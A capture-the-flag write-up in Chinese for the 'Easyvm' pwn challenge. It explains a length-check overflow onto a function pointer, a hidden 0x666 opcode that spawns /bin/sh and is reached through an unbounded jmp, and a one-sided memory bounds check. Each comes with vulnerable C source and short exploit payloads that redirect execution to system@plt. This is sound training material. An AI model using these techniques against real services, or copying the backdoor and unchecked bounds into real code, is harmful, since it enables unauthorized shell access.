# Easyvm

## 0x01 逻辑漏洞+越界写

Login时的报文格式为：

```c
verison(4byte)	|		opcode(4 byte)
len(4 byte)			| usernmae:passswd;
uid(8 byte)
```

在处理用户密码时，判断用户输入的密码长度是用用户写入的报文格式中的len-用户名长度进行比较计算的。由于len是用户提供的，可以被设置为任意值，所以一旦将len改小就可以通过检查。

```c
    if((len - name_len) > MAX_PASSWORDS+2+8){
        //printf("packet is wrong len %d\n",len - name_len);
        printf("packet is wrong \n");
        conn_proto->user->name_len = 0;
        conn_proto->user->passwd_len = 0;
        return -1;
    }
    memcpy(conn_proto->user->passwd, name_off+1, passwd_len);
```

拷贝的passwd_len是通过strstr查找 `;`计算到passwd字符的末尾再减去name的末尾减1得到的，那么我们可以将`;`布置在uid中，从而实现passwd能够最多越界修改7字节。那么即可修改show_func函数指针。

```c
typedef struct srv_user_t {
    uint32_t name_len;
    char name[MAX_PASSWORDS];
    uint32_t passwd_len;
    char passwd[MAX_PASSWORDS];
    void* show_func;
    uint64_t uid;
} srv_user_t;
```

而show_passwd，会将passwd加密输出，此时也会连带着将show_func函数指针的低四字节加密输出。所以通过该函数可以得到加密后的函数指针。

```c
int show_passwd(char* passwd){
    char* buf = malloc(0x200);
    if(buf == NULL){
        exit(1);
    }
    memset(buf, '\x00', 0x200);
    strcpy(buf, passwd);
    int len = strlen(buf)/4;
    for(int i=0; i<len; i++){
        uint32_t tmp = *((uint32_t*)buf+i);
        uint32_t enc_tmp = encode(tmp);
        *((uint32_t*)buf+i) = enc_tmp;
    }
    printf("encode_passwd: %s\n", buf);
    free(buf);
    return 1;
}

```

因为只有4字节加密，所以通过加密函数爆破得到函数地址，从而可以得到system@plt地址。最后利用上述溢出修改函数指针为system@plt地址，触发执行getshell。

## 0x02 后门+跳转指令未做上界检查

实现了一个汇编指令的解析执行的vm。指令时存在一个0x666的操作码可以进入后门。但是，指令解析时并没有指令能被解析成0x666的操作码。此外，还存在jmp、mov等指令。

```c
static inline void tvm_step(struct tvm_ctx *vm, int *instr_idx)
{
	int **args = vm->prog->args[*instr_idx];

	switch (vm->prog->instr[*instr_idx]) {
	...
/* mov   */	case 0x2:  *args[0] = *args[1]; break;
		...
/* jmp	 */	case 0x16: *instr_idx = *args[0] - 1; break;
			...
			case 0x666:
				printf("Warning, you enter the backdoor\n");
				system("/bin/sh");
				break;
	};
}
```

执行指令时，并没有对指令数组的下标进行检查，所以可以结合jmp指令使得指令数组向上越界到我们自己输入的`0x666`的内存，从而进入后门。

```c
void tvm_vm_run(struct tvm_ctx *vm)
{
	int *instr_idx = &vm->mem->registers[0x8].i32;
	*instr_idx = vm->prog->start;

	for (; vm->prog->instr[*instr_idx] != -0x1; ++(*instr_idx))
		tvm_step(vm, instr_idx);
}
```

```c
py = f'''
mov eax, -0x648c
jmp eax
'''.encode()
```

## 0x03 内存越界读写

对于内存操作，mov eax [-200000]这种，只检查了内存读写是否超过了内存的高地址，而没有检查是否向上读写了低地址。

```c
static int **tvm_parse_args(
	struct tvm_ctx *vm, const char **instr_tokens, int *instr_place)
{
	int **args = calloc(sizeof(int *), MAX_ARGS);

	for (int i = 0; i < MAX_ARGS; ++i) {
		if (!instr_tokens[*instr_place+1 + i]
			|| !strlen(instr_tokens[*instr_place+1 + i]))
			continue;

		char *newline = strchr(instr_tokens[*instr_place+1 + i], '\n');

		if (newline)
			*newline = 0;

		/* Check to see if the token specifies a register */
		int *regp = token_to_register(
			instr_tokens[*instr_place+1 + i], vm->mem);

		if (regp) {
			args[i] = regp;
			continue;
		}

		/* Check to see whether the token specifies an address */
		if (instr_tokens[*instr_place+1 + i][0] == '[') {
			char *end_symbol = strchr(
				instr_tokens[*instr_place+1 + i], ']');

			if (end_symbol) {
				*end_symbol = 0;

				int *dest = &((int *)vm->mem->mem_space)[
					tvm_parse_value(instr_tokens[
						*instr_place+1 + i] + 1)];
				// check mem space boundary
        //只检查了高地址
				if ((char *)dest > (char *)vm->mem->mem_space + vm->mem->mem_space_size) {
				//if ((char *)dest < (char *)mem->registers[0x7].i32_ptr) {
					free(args);
					return NULL;
				}

				args[i] = dest;

				continue;
			}
		}

		/* Check if the argument is a label */
		int addr = tvm_htab_find(
			vm->prog->label_htab, instr_tokens[*instr_place+1 + i]);

		if (addr != -1) {
			args[i] = tvm_add_value(vm, addr);
			continue;
		}

		/* Fuck it, parse it as a value */
		args[i] = tvm_add_value(
			vm, tvm_parse_value(instr_tokens[*instr_place+1 + i]));
	}

	return args;
}
```

所以，可以通过内存读写写上溢出修改前面user结构体的函数指针，将其修改为system@plt地址，然后触发执行。

```c
py = f'''
mov eax, [-1114]
sub eax, {func_addr}
mov [-1114], eax
'''.encode()
```

